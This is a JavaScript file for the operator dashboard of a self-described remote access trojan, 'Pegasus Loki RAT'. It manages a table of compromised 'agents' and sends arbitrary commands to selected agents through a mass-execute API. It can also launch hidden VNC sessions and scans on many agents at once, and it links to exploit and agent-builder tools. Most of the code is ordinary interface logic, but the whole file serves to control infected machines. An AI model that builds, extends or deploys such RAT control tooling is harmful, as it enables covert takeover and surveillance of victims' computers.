/**
 * Pegasus Loki RAT - Core JavaScript Functions
 * Advanced dashboard functionality and interactions
 */

class PegasusCore {
    constructor() {
        this.config = {
            refreshInterval: 30000, // 30 seconds
            animationDuration: 300,
            notificationTimeout: 5000,
            maxLogEntries: 100
        };

        this.state = {
            isOnline: true,
            selectedAgents: new Set(),
            activeTools: new Map(),
            notifications: []
        };

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.initializeComponents();
        this.startPeriodicUpdates();
        this.showWelcomeMessage();
    }

    setupEventListeners() {
        // Global keyboard shortcuts
        document.addEventListener('keydown', this.handleKeyboardShortcuts.bind(this));

        // Window events
        window.addEventListener('beforeunload', this.handleBeforeUnload.bind(this));
        window.addEventListener('online', () => this.updateConnectionStatus(true));
        window.addEventListener('offline', () => this.updateConnectionStatus(false));

        // Form submissions
        document.addEventListener('submit', this.handleFormSubmission.bind(this));

        // Click events
        document.addEventListener('click', this.handleGlobalClick.bind(this));
    }

    initializeComponents() {
        this.initializeAgentTable();
        this.initializeToolCards();
        this.initializeNotifications();
        this.initializeModals();
        this.initializeTheme();
    }

    // Agent Management
    initializeAgentTable() {
        const table = document.querySelector('.agents-table');
        if (!table) return;

        // Initialize sorting
        this.setupTableSorting(table);

        // Initialize selection
        this.setupAgentSelection();

        // Initialize filters
        this.setupAgentFilters();
    }

    setupTableSorting(table) {
        const headers = table.querySelectorAll('th[data-sort]');
        headers.forEach(header => {
            header.style.cursor = 'pointer';
            header.addEventListener('click', () => {
                const column = header.dataset.sort;
                const direction = header.classList.contains('sort-asc') ? 'desc' : 'asc';
                this.sortTable(table, column, direction);

                // Update header classes
                headers.forEach(h => h.classList.remove('sort-asc', 'sort-desc'));
                header.classList.add(`sort-${direction}`);
            });
        });
    }

    sortTable(table, column, direction) {
        const tbody = table.querySelector('tbody');
        const rows = Array.from(tbody.querySelectorAll('tr'));

        rows.sort((a, b) => {
            const aValue = this.getCellValue(a, column);
            const bValue = this.getCellValue(b, column);

            if (direction === 'asc') {
                return aValue.localeCompare(bValue, undefined, { numeric: true });
            } else {
                return bValue.localeCompare(aValue, undefined, { numeric: true });
            }
        });

        rows.forEach(row => tbody.appendChild(row));
    }

    getCellValue(row, column) {
        const cell = row.querySelector(`[data-column="${column}"]`);
        return cell ? cell.textContent.trim() : '';
    }

    setupAgentSelection() {
        const selectAllCheckbox = document.getElementById('select-all-checkbox');
        const agentCheckboxes = document.querySelectorAll('.agent-checkbox');

        if (selectAllCheckbox) {
            selectAllCheckbox.addEventListener('change', (e) => {
                agentCheckboxes.forEach(checkbox => {
                    checkbox.checked = e.target.checked;
                    this.updateAgentSelection(checkbox);
                });
                this.updateSelectionUI();
            });
        }

        agentCheckboxes.forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                this.updateAgentSelection(checkbox);
                this.updateSelectionUI();
            });
        });
    }

    updateAgentSelection(checkbox) {
        const agentId = checkbox.value;
        if (checkbox.checked) {
            this.state.selectedAgents.add(agentId);
        } else {
            this.state.selectedAgents.delete(agentId);
        }
    }

    updateSelectionUI() {
        const selectedCount = this.state.selectedAgents.size;
        const totalCount = document.querySelectorAll('.agent-checkbox').length;
        const selectAllCheckbox = document.getElementById('select-all-checkbox');

        // Update select all checkbox state
        if (selectAllCheckbox) {
            if (selectedCount === 0) {
                selectAllCheckbox.indeterminate = false;
                selectAllCheckbox.checked = false;
            } else if (selectedCount === totalCount) {
                selectAllCheckbox.indeterminate = false;
                selectAllCheckbox.checked = true;
            } else {
                selectAllCheckbox.indeterminate = true;
            }
        }

        // Update action buttons
        this.updateActionButtons(selectedCount);

        // Update selection counter
        this.updateSelectionCounter(selectedCount, totalCount);
    }

    updateActionButtons(selectedCount) {
        const actionButtons = document.querySelectorAll('[data-requires-selection]');
        actionButtons.forEach(button => {
            button.disabled = selectedCount === 0;
            button.classList.toggle('disabled', selectedCount === 0);
        });
    }

    updateSelectionCounter(selected, total) {
        const counter = document.getElementById('selection-counter');
        if (counter) {
            counter.textContent = `${selected} of ${total} selected`;
            counter.style.display = selected > 0 ? 'block' : 'none';
        }
    }

    setupAgentFilters() {
        const filterInputs = document.querySelectorAll('[data-filter]');
        filterInputs.forEach(input => {
            input.addEventListener('input', this.debounce(() => {
                this.applyFilters();
            }, 300));
        });
    }

    applyFilters() {
        const filters = {};
        document.querySelectorAll('[data-filter]').forEach(input => {
            if (input.value.trim()) {
                filters[input.dataset.filter] = input.value.trim().toLowerCase();
            }
        });

        const rows = document.querySelectorAll('.agent-row');
        rows.forEach(row => {
            let visible = true;

            for (const [column, value] of Object.entries(filters)) {
                const cell = row.querySelector(`[data-column="${column}"]`);
                if (cell && !cell.textContent.toLowerCase().includes(value)) {
                    visible = false;
                    break;
                }
            }

            row.style.display = visible ? '' : 'none';
        });
    }

    // Tool Management
    initializeToolCards() {
        const toolCards = document.querySelectorAll('.tool-card');
        toolCards.forEach(card => {
            this.setupToolCard(card);
        });
    }

    setupToolCard(card) {
        const toolName = card.dataset.tool;

        // Add hover effects
        card.addEventListener('mouseenter', () => {
            this.animateToolCard(card, 'enter');
        });

        card.addEventListener('mouseleave', () => {
            this.animateToolCard(card, 'leave');
        });

        // Add click handler
        const button = card.querySelector('.tool-btn, .btn-tool');
        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.launchTool(toolName, card);
            });
        }
    }

    animateToolCard(card, type) {
        const icon = card.querySelector('.tool-icon');
        if (!icon) return;

        if (type === 'enter') {
            icon.style.transform = 'scale(1.1) rotate(5deg)';
            card.style.boxShadow = '0 10px 30px rgba(0, 255, 65, 0.3)';
        } else {
            icon.style.transform = 'scale(1) rotate(0deg)';
            card.style.boxShadow = '';
        }
    }

    launchTool(toolName, card) {
        // Show loading state
        this.setToolCardLoading(card, true);

        // Simulate tool launch
        setTimeout(() => {
            this.setToolCardLoading(card, false);

            // Open tool window or navigate
            const toolUrl = this.getToolUrl(toolName);
            if (toolUrl) {
                if (toolName === 'agent-builder' || toolName === 'system-monitor') {
                    // Open in popup
                    const popup = window.open(toolUrl, toolName, 'width=1200,height=800,scrollbars=yes');
                    if (popup) {
                        this.trackActiveWindow(toolName, popup);
                    }
                } else {
                    // Navigate to tool page
                    window.location.href = toolUrl;
                }
            }

            this.showNotification(`${toolName} launched successfully`, 'success');
        }, 1000);
    }

    getToolUrl(toolName) {
        const urls = {
            'web-scanner': '/tools/web-scanner',
            'exploit': '/tools/exploit',
            'hvnc': '/tools/hvnc',
            'pantheon': '/tools/pantheon',
            'agent-builder': '/tools/agent-builder',
            'system-monitor': '/tools/system-monitor',
            'icarus': '/tools/icarus'
        };
        return urls[toolName];
    }

    setToolCardLoading(card, loading) {
        const button = card.querySelector('.tool-btn, .btn-tool');
        const icon = card.querySelector('.tool-icon');

        if (loading) {
            button.disabled = true;
            button.innerHTML = '<span class="loading"></span> Loading...';
            card.classList.add('loading');
        } else {
            button.disabled = false;
            button.innerHTML = button.dataset.originalText || 'Launch';
            card.classList.remove('loading');
        }
    }

    trackActiveWindow(toolName, popup) {
        this.state.activeTools.set(toolName, popup);

        // Check if window is closed
        const checkClosed = setInterval(() => {
            if (popup.closed) {
                this.state.activeTools.delete(toolName);
                clearInterval(checkClosed);
                this.showNotification(`${toolName} closed`, 'info');
            }
        }, 1000);
    }

    // Mass Operations
    executeMassCommand(command) {
        const selectedAgents = Array.from(this.state.selectedAgents);

        if (selectedAgents.length === 0) {
            this.showNotification('Please select at least one agent', 'warning');
            return;
        }

        if (!confirm(`Execute "${command}" on ${selectedAgents.length} selected agent(s)?`)) {
            return;
        }

        this.showNotification(`Executing command on ${selectedAgents.length} agents...`, 'info');

        // Send command to server
        this.sendMassCommand(command, selectedAgents)
            .then(response => {
                this.showNotification('Command executed successfully', 'success');
                this.refreshAgentList();
            })
            .catch(error => {
                this.showNotification('Failed to execute command', 'error');
                console.error('Mass command error:', error);
            });
    }

    async sendMassCommand(command, agentIds) {
        const response = await fetch('/api/mass-execute', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                command: command,
                agents: agentIds
            })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        return response.json();
    }

    launchMassHVNC() {
        const selectedAgents = Array.from(this.state.selectedAgents);

        if (selectedAgents.length === 0) {
            this.showNotification('Please select at least one agent for HVNC', 'warning');
            return;
        }

        if (!confirm(`Launch HVNC on ${selectedAgents.length} selected agent(s)?`)) {
            return;
        }

        this.showNotification('Launching HVNC...', 'info');

        fetch('/api/mass-hvnc', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ agents: selectedAgents })
        })
            .then(response => response.json())
            .then(data => {
                this.showNotification('HVNC launched successfully', 'success');
                window.open('/tools/hvnc', 'HVNCControl', 'width=1024,height=768,scrollbars=yes');
            })
            .catch(error => {
                this.showNotification('Failed to launch HVNC', 'error');
                console.error('HVNC launch error:', error);
            });
    }

    launchMassScan() {
        const selectedAgents = Array.from(this.state.selectedAgents);

        if (selectedAgents.length === 0) {
            this.showNotification('Please select at least one agent to scan', 'warning');
            return;
        }

        const scanType = prompt('Enter scan type (web, network, system):', 'web');
        if (!scanType) return;

        if (!confirm(`Launch ${scanType} scan on ${selectedAgents.length} selected agent(s)?`)) {
            return;
        }

        this.showNotification(`Launching ${scanType} scan...`, 'info');

        fetch('/api/mass-scan', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                agents: selectedAgents,
                scan_type: scanType
            })
        })
            .then(response => response.json())
            .then(data => {
                this.showNotification(`${scanType} scan launched successfully`, 'success');
                if (data.scan_id) {
                    window.open(`/tools/scan-results?scan_id=${data.scan_id}`, 'ScanResults', 'width=1200,height=800,scrollbars=yes');
                }
            })
            .catch(error => {
                this.showNotification('Failed to launch scan', 'error');
                console.error('Scan launch error:', error);
            });
    }

    // Notifications
    initializeNotifications() {
        // Create notification container if it doesn't exist
        if (!document.getElementById('notification-container')) {
            const container = document.createElement('div');
            container.id = 'notification-container';
            container.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 10000;
                pointer-events: none;
            `;
            document.body.appendChild(container);
        }
    }

    showNotification(message, type = 'info', duration = null) {
        const notification = {
            id: Date.now(),
            message,
            type,
            timestamp: new Date()
        };

        this.state.notifications.push(notification);
        this.renderNotification(notification);

        // Auto-remove after duration
        setTimeout(() => {
            this.removeNotification(notification.id);
        }, duration || this.config.notificationTimeout);
    }

    renderNotification(notification) {
        const container = document.getElementById('notification-container');
        const element = document.createElement('div');

        element.id = `notification-${notification.id}`;
        element.className = `notification notification-${notification.type}`;
        element.style.cssText = `
            background: var(--bg-card);
            border: 1px solid var(--border-accent);
            border-radius: 8px;
            padding: 1rem 1.5rem;
            margin-bottom: 10px;
            box-shadow: var(--shadow-primary);
            pointer-events: auto;
            animation: slideInRight 0.3s ease;
            max-width: 300px;
        `;

        const typeIcons = {
            success: '✅',
            error: '❌',
            warning: '⚠️',
            info: 'ℹ️'
        };

        element.innerHTML = `
            <div style="display: flex; align-items: center; gap: 0.5rem;">
                <span style="font-size: 1.2rem;">${typeIcons[notification.type] || 'ℹ️'}</span>
                <span style="color: var(--text-secondary);">${notification.message}</span>
                <button onclick="pegasus.removeNotification(${notification.id})" 
                        style="margin-left: auto; background: none; border: none; color: var(--text-muted); cursor: pointer;">×</button>
            </div>
        `;

        container.appendChild(element);
    }

    removeNotification(id) {
        const element = document.getElementById(`notification-${id}`);
        if (element) {
            element.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => {
                element.remove();
            }, 300);
        }

        this.state.notifications = this.state.notifications.filter(n => n.id !== id);
    }

    // Modals
    initializeModals() {
        // Close modal when clicking outside
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                this.closeModal(e.target);
            }
        });

        // Close modal with Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                const activeModal = document.querySelector('.modal.active');
                if (activeModal) {
                    this.closeModal(activeModal);
                }
            }
        });
    }

    openModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }
    }

    closeModal(modal) {
        if (typeof modal === 'string') {
            modal = document.getElementById(modal);
        }

        if (modal) {
            modal.classList.remove('active');
            document.body.style.overflow = '';
        }
    }

    // Theme Management
    initializeTheme() {
        const savedTheme = localStorage.getItem('pegasus-theme') || 'dark';
        this.setTheme(savedTheme);
    }

    setTheme(theme) {
        document.documentElement.setAttribute('data-theme', theme);
        localStorage.setItem('pegasus-theme', theme);
    }

    toggleTheme() {
        const currentTheme = document.documentElement.getAttribute('data-theme') || 'dark';
        const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
        this.setTheme(newTheme);
    }

    // Periodic Updates
    startPeriodicUpdates() {
        // Refresh agent list periodically
        setInterval(() => {
            if (this.state.isOnline) {
                this.refreshAgentList();
            }
        }, this.config.refreshInterval);

        // Update timestamps
        setInterval(() => {
            this.updateTimestamps();
        }, 60000); // Every minute
    }

    async refreshAgentList() {
        try {
            const response = await fetch('/api/agents');
            if (response.ok) {
                const agents = await response.json();
                this.updateAgentTable(agents);
            }
        } catch (error) {
            console.error('Failed to refresh agent list:', error);
        }
    }

    updateAgentTable(agents) {
        // Update agent rows with new data
        agents.forEach(agent => {
            const row = document.querySelector(`[data-agent-id="${agent.id}"]`);
            if (row) {
                this.updateAgentRow(row, agent);
            }
        });
    }

    updateAgentRow(row, agent) {
        // Update status
        const statusCell = row.querySelector('[data-column="status"]');
        if (statusCell) {
            const isOnline = agent.is_online;
            statusCell.className = `status-indicator ${isOnline ? 'online' : 'offline'}`;
            statusCell.innerHTML = `
                <span class="status-dot"></span>
                ${isOnline ? 'Online' : (agent.last_online || 'Never')}
            `;
        }

        // Update other cells as needed
        row.classList.toggle('online', agent.is_online);
        row.classList.toggle('offline', !agent.is_online);
    }

    updateTimestamps() {
        const timestamps = document.querySelectorAll('[data-timestamp]');
        timestamps.forEach(element => {
            const timestamp = parseInt(element.dataset.timestamp);
            if (timestamp) {
                element.textContent = this.formatRelativeTime(timestamp);
            }
        });
    }

    formatRelativeTime(timestamp) {
        const now = Date.now();
        const diff = now - timestamp;
        const seconds = Math.floor(diff / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        const days = Math.floor(hours / 24);

        if (days > 0) return `${days}d ago`;
        if (hours > 0) return `${hours}h ago`;
        if (minutes > 0) return `${minutes}m ago`;
        return 'Just now';
    }

    // Connection Status
    updateConnectionStatus(isOnline) {
        this.state.isOnline = isOnline;

        const indicator = document.getElementById('connection-status');
        if (indicator) {
            indicator.className = `connection-status ${isOnline ? 'online' : 'offline'}`;
            indicator.textContent = isOnline ? 'Online' : 'Offline';
        }

        this.showNotification(
            isOnline ? 'Connection restored' : 'Connection lost',
            isOnline ? 'success' : 'warning'
        );
    }

    // Event Handlers
    handleKeyboardShortcuts(e) {
        // Ctrl+A - Select all agents
        if (e.ctrlKey && e.key === 'a' && document.activeElement.tagName !== 'INPUT') {
            e.preventDefault();
            this.selectAllAgents();
        }

        // Ctrl+D - Deselect all agents
        if (e.ctrlKey && e.key === 'd') {
            e.preventDefault();
            this.deselectAllAgents();
        }

        // Ctrl+R - Refresh
        if (e.ctrlKey && e.key === 'r') {
            e.preventDefault();
            this.refreshAgentList();
        }

        // Ctrl+T - Toggle theme
        if (e.ctrlKey && e.key === 't') {
            e.preventDefault();
            this.toggleTheme();
        }
    }

    handleBeforeUnload(e) {
        if (this.state.activeTools.size > 0) {
            e.preventDefault();
            e.returnValue = 'You have active tools running. Are you sure you want to leave?';
        }
    }

    handleFormSubmission(e) {
        const form = e.target;
        if (form.classList.contains('mass-action-form')) {
            const action = e.submitter?.name;

            if (action === 'execute') {
                const command = form.querySelector('#cmd')?.value?.trim();
                if (!command) {
                    e.preventDefault();
                    this.showNotification('Please enter a command', 'warning');
                    return;
                }

                if (this.state.selectedAgents.size === 0) {
                    e.preventDefault();
                    this.showNotification('Please select at least one agent', 'warning');
                    return;
                }
            }
        }
    }

    handleGlobalClick(e) {
        // Handle tool card clicks
        const toolCard = e.target.closest('.tool-card');
        if (toolCard && e.target.classList.contains('tool-btn')) {
            e.preventDefault();
            const toolName = toolCard.dataset.tool;
            this.launchTool(toolName, toolCard);
        }
    }

    // Utility Methods
    selectAllAgents() {
        const checkboxes = document.querySelectorAll('.agent-checkbox');
        checkboxes.forEach(checkbox => {
            checkbox.checked = true;
            this.updateAgentSelection(checkbox);
        });
        this.updateSelectionUI();
    }

    deselectAllAgents() {
        const checkboxes = document.querySelectorAll('.agent-checkbox');
        checkboxes.forEach(checkbox => {
            checkbox.checked = false;
            this.updateAgentSelection(checkbox);
        });
        this.updateSelectionUI();
    }

    debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    }

    showWelcomeMessage() {
        setTimeout(() => {
            this.showNotification('Welcome to Pegasus Loki RAT Dashboard', 'success');
        }, 1000);
    }
}

// Initialize Pegasus Core when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.pegasus = new PegasusCore();
});

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
    module.exports = PegasusCore;
}
